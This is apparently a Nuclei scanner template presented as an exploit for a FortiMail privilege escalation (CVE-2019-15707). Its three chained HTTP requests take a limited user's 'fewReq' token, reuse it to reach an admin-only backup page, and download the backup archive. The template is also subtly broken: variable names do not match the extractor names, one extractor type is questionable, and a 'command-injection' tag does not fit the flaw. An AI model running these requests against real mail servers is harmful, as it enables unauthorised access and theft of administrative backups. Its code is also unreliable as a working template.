id: cve-2019-15707-fortimail-privilege-escalation
info:
  name: FortiMail Privilege Escalation (CVE-2019-15707)
  author: YourName
  severity: high
  description: |
    This exploit allows an attacker to escalate privileges in FortiMail through a vulnerability in the `fewReq` parameter.
    The attacker can collect the `fewReq` token from a limited user account and use it to access privileged endpoints, 
    such as downloading backups, which are intended for admins only.
  tags: fortimail, privilege-escalation, cve-2019-15707, command-injection, backup-access

requests:
  # Passo 1: Coleta do token fewReq de um usuário limitado
  - method: GET
    path:
      - "{{BaseURL}}/module/admin.fe"
    headers:
      User-Agent: Nuclei
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    matchers:
      - type: word
        words:
          - "fewReq"
        part: body
        name: Token Matcher
    extractors:
      - type: regex
        name: Extract Token
        regex: "fewReq=:[A-Za-z0-9+=]+"
        group: 0

  # Passo 2: Substitui o token fewReq para acessar o endpoint privilegiado (exemplo: download de backup)
  - method: GET
    path:
      - "{{BaseURL}}/module/admin.fe?fewReq=:B:{{ExtractedToken}}"
    headers:
      User-Agent: Nuclei
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    matchers:
      - type: word
        words:
          - "Backup"
        part: body
        name: Backup Download Matcher
    extractors:
      - type: regex
        name: Extract Backup URL
        regex: "href=\"(.*?backup.*?)\""
        group: 1

  # Passo 3: Acessa o backup usando a URL extraída
  - method: GET
    path:
      - "{{BaseURL}}{{ExtractedBackupURL}}"
    headers:
      User-Agent: Nuclei
      Accept: application/octet-stream
    matchers:
      - type: word
        words:
          - "Backup"
        part: body
        name: Successful Backup Download Matcher
    extractors:
      - type: file
        name: Backup File
        extension: tar.gz
